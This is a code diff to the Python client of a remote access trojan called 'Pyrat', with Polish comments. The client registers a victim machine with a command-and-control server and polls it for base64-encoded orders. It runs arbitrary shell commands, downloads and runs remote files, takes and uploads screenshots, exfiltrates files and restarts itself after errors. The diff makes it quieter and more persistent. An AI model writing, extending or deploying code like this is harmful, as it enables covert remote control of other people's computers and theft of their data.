@@ -41,7 +41,7 @@ det_ext_ip = requests.get('https://api.ipify.org').text
 
 my_headers = requests.utils.default_headers()
 my_headers.update({
-        'User-Agent': 'Pyrat_Client_Beta',
+        'User-Agent': 'Pyrat Client 2.0 Beta',
     })
 s = requests.Session()
 
@@ -66,7 +66,7 @@ def send_request(page, data, *args):
         say_hello = s.post(home_host+'/'+page+'/', data=payload, headers=my_headers, files=args[0])
     else:
         say_hello = s.post(home_host+'/'+page+'/', data=payload, headers=my_headers)
-    print(say_hello.text)
+    #print(say_hello.text)
     return say_hello
 
 
@@ -79,7 +79,7 @@ def register_at_db():
         'det_int_ip': det_int_ip,
         'det_ext_ip': det_ext_ip,
     }
-    print(cli_data)
+    #print(cli_data)
     send_request('register', cli_data)
 
 
@@ -123,29 +123,40 @@ def ping(last_activity, det_mac):
 
 """
 
-Function that allows to run any command. If you want use cmd.exe, the command should be called from system32 folder.
-Obligatory-necessared is only command, arguments are optional. New list params_list should be created, due to
-isufficient [space] key and error during run arguments ['dirC:' instead 'dir C:'].
+Function that allows to run any command. Two variants: for command with timeout and for execute and close.
+It was a little bit complicated, to manage function with can take from one argument to theoretical infinity.
+Due to this, always all args are splitted to a one list.
+Commands with timeout are simple - last two arguments are timeout parameter with time.
+Of course due to STDOUT, result should be filtered and prepared to send to CC server.
+Due to limited cmd.exe encoding, to allow an access to folder with specific language characters, the result must be decoded
+(to remove hex symbols), and again decoded/replaced, to get the result prepared to send.
 
 """
 
 
-def run_command(command, *args):
-    #print(args)
-    params_list = []
-    for a in args:
-        params_list.append(a + ' ')
-    s = '\, '
-    s.join(params_list)
-    print(params_list)
-    execute = subprocess.run([command, params_list], stdout=subprocess.PIPE)
-    if 'stdout=b\'\'' in str(execute):
-        result = f'''Command {command} executed with no output'''
-    else:
-        result = (re.search('stdout=b(.*)\)', str(execute)).group(1)).replace('\'', '')
-    print(result)
-    print('Command executed')
-    return str(result)
+def run_command(cmd, *args):
+    r_args = []
+    if len(args) > 0:
+        r_args = [x for x in args]
+    r_args.insert(0, cmd)
+    try:
+        if len(r_args) > 2 and r_args[-2] == '-timeout':
+            execute = subprocess.Popen(r_args[:-2], stdout=subprocess.PIPE)
+            time.sleep(int(args[-1]))
+            print(execute.pid)
+            execute.kill()
+            result = (re.search('b\' (.*)\'', str(execute.stdout.read())).group(1)).replace('\\n', '<br>').replace('\\r', '')
+            #print(result)
+        else:
+            execute_raw = subprocess.check_output(r_args, shell=True)
+            execute = execute_raw.decode('cp852')
+            execute_list = ['<br>' if i == '\n' else i for i in iter(execute)]
+            result = (''.join(execute_list)).replace(u'\xa0', u' ').replace('\r', '')
+            #print(result)
+        return str('[SUCESS]' + result)
+    except FileNotFoundError:
+        result = '[ERROR] Executable file not found'
+        return str(result)
 
 
 """
@@ -163,20 +174,22 @@ def downloader(url, path, *args):
     with open(path + '\\' + savefilename, 'wb') as f:
         shutil.copyfileobj(r.raw, f)
     print('Download completed.')
-    if len(args) > 0 and args[0] == 'y':
+    if len(args) > 0 and args[0] == '-run':
         run_command(path + '\\' + savefilename)
-        confirmation = 'File %s downloaded, executed' % url
+        confirmation = '[SUCESS] File %s downloaded, executed' % url
         return confirmation
     else:
         print('Not requested to run downloaded file.')
-        confirmation = 'File %s downloaded, not executed' % url
+        confirmation = '[SUCESS] File %s downloaded, not executed' % url
         return confirmation
 
 
 """
 
 Simple function that show message box.
-Additional window from TK drawer will be hidded.
+Message box will be available 30 second, and after this time, it will be killed 
+(for unblock the rest of code execution) if user don't interact with them.
+
 
 """
 
@@ -186,11 +199,14 @@ def popup(text, title, *args):
     r_window.withdraw()
     print(text)
     print(title)
-    if '%' in text or title:
-        messagebox.showinfo(text.replace('%', ' '), title.replace('%', ' '))
+    r_window.after(30000, r_window.destroy)
+    if '_' in text or title:
+        if messagebox.showinfo(text.replace('_', ' '), title.replace('_', ' ')):
+            r_window.destroy()
     else:
-        messagebox.showinfo(text, title)
-    confirmation = 'Messagebox showed'
+        if messagebox.showinfo(text, title):
+            r_window.destroy()
+    confirmation = '[SUCESS] Messagebox showed'
     return confirmation
 
 
@@ -207,18 +223,21 @@ Name of screenshot is a filtered MAC (without :) and current time.
 def screenshot(*args):
     curr_user = os.getlogin()
     sys_disk = os.getenv("SystemDrive")
-    print(sys_disk)
+    #print(sys_disk)
     app_url = 'https://raw.githubusercontent.com/npocmaka/batch.scripts/master/hybrids/.net/c/screenCapture.bat'
     app_dir = sys_disk + '\\Users\\' + curr_user + '\\AppData\\Local\\Temp\\'
-    print(app_dir)
+    #print(app_dir)
     r = s.get(app_url)
     with open(app_dir + 'screenCapture.bat', 'w') as f:
         f.write(r.text)
     screen_name = (str(time.strftime("%Y%m%d-%H%M%S")) + '_' + det_mac)
-    print(screen_name)
-    run_command(sys_disk + '\\windows\\system32\\cmd.exe', '/C', 'cd ' + app_dir, '&&', 'screenCapture.bat', screen_name + '.jpg')
-    fileupload(app_dir + screen_name + '.jpg')
-    confirmation = 'Screenshot %s.jpg uploaded' % screen_name
+    #print(screen_name)
+    make_ss = run_command('cd', app_dir, '&&', 'screenCapture.bat', screen_name + '.jpg')
+    send_ss = fileupload(app_dir + screen_name + '.jpg')
+    if '[SUCESS]' in make_ss and send_ss:
+        confirmation = '[SUCESS] Screenshot %s.jpg uploaded' % screen_name
+    else:
+        confirmation = '[ERROR] Screenshot %s.jpg not uploaded' % screen_name
     return confirmation
 
 
@@ -232,9 +251,9 @@ def fileupload(file_path, *args):
         }
         #say_file = s.post(home_host + '/upload/', files=file, data=payload)
         send_request('upload', cli_data, file)
-        confirmation = 'File %s uploaded' % file_path
+        confirmation = '[SUCESS] File %s uploaded' % file_path
     else:
-        confirmation = 'File %s not exists' % file_path
+        confirmation = '[ERROR] File %s not exists' % file_path
     return confirmation
 
 
@@ -244,37 +263,47 @@ There is a main procedure of client.
 At the beginning, we have two lists: with received ID's of command, and with send ID's of executed
 commands.
 This should prevent from duplicated command executions.
+Aditionally path to script (after error, script self-rerun).
 
 """
 
 
 received_ids = []
 send_commands = []
+script_path = os.path.abspath(__file__)
 
 
 """
 
-PC try to connect to remote server - in range 0 to 100
-If exception (ANY) will occur, the loop back to beginning.
+PC try to connect to remote server - in range 0 to 4
+If exception (ANY) will occur, the loop will back to beginning.
+After 4 runs, the script will re-run again.
 
 """
 
-for i in range (0,100):
+try_cc = 1
+
+while try_cc < 4:
     try:
-        print('++++ PROBUJE POLACZYC Z CC ++++')
+        print('++++ REJESTRACJA KLIENTA: PROBUJE POLACZYC Z CC: PROBA %s ++++' % try_cc)
         register_at_db()
+        break
     except Exception as e:
-        print('++++ NIEPOWODZENIE, SLEEP NA 30 SEKUND ++++')
+        print('++++ REJESTRACJA KLIENTA: NIEPOWODZENIE, SLEEP NA 10 SEKUND ++++')
         print(e)
-        time.sleep(30)
-        continue
-    break
+        time.sleep(10)
+    try_cc += 1
+    if try_cc == 4:
+        subprocess.Popen(['python', script_path])
+        raise SystemExit
+
+
 
 
 """
 
 Infinite loop - to get and execute commands fetched from remote CC server.
-If exceptions will be occured - the loop back to beginning.
+If exceptions will be occured - the script will re-run.
 
 """
 
@@ -285,7 +314,6 @@ cli_data = {
 
 while True:
     try:
-    #if 1 == 1:
         print('++++ NOWA ITERCJA, DRUKUJE LISTY ++++')
         print('Otrzymane id %s' % received_ids)
         print('Wysłane rezultaty o id %s ' % send_commands)
@@ -297,10 +325,23 @@ while True:
             'screenshot': screenshot,
             'upload': fileupload
         }
-        say_ready = send_request('order', cli_data)
+        try_ord = 1
+        while try_ord < 4:
+            try:
+                print('++++ POBIERAM ZLECENIE: PROBUJE POLACZYC Z CC: PROBA %s ++++' % try_ord)
+                say_ready = send_request('order', cli_data)
+                break
+            except Exception as e:
+                print(e)
+                print('++++ POBIERAM ZLECENIE: PROBLEM Z POLACZENIEM, SLEEP NA 10 SEKUND ++++')
+                time.sleep(10)
+            try_ord += 1
+            if try_ord == 4:
+                subprocess.Popen(['python', script_path])
+                raise SystemExit
         resp_data = say_ready.json()
         resp_dict = json.loads(base64.b64decode(resp_data['65hFDs']).decode('utf-8'))
-        print(resp_dict)
+        #print(resp_dict)
         time_curr = time.strftime('%Y-%m-%d %H:%M:%S')
         # The pong is necessary, if ID was executed earlier
         pong = time_curr
@@ -312,7 +353,11 @@ while True:
                 print('++++ ZNALEZIONO FUNKCJE: %s ++++' % resp_dict['function'])
                 print('++++ DODATKOWE ARGUMENTY: %s ++++' % resp_dict['params'])
                 command_to_run = command_dict[resp_dict['function']]
-                result_from_run = command_to_run(*resp_dict['params'])
+                # For run command with arg or multiple args (see info in run_command function)
+                if len(resp_dict['params']) == 1:
+                    result_from_run = command_to_run(resp_dict['params'][0])
+                else:
+                    result_from_run = command_to_run(*resp_dict['params'])
                 received_ids.append(resp_dict['uniqueid'])
                 # Check, that executed in a few moments command was already send or not
                 if resp_dict['uniqueid'] not in send_commands:
@@ -336,7 +381,9 @@ while True:
     # If there is an exception (no connection or something) - go to the beginning of the loop
     except Exception as e:
         print(e)
-        continue
+        print('!!!! WYSTAPIL BLAD, URUCHAMIAM SKRYPT PONOWNIE !!!!')
+        subprocess.Popen(['python', script_path])
+        raise SystemExit
     print('++++ SLEEP NA 10 SEKUND ++++')
     time.sleep(10)
 
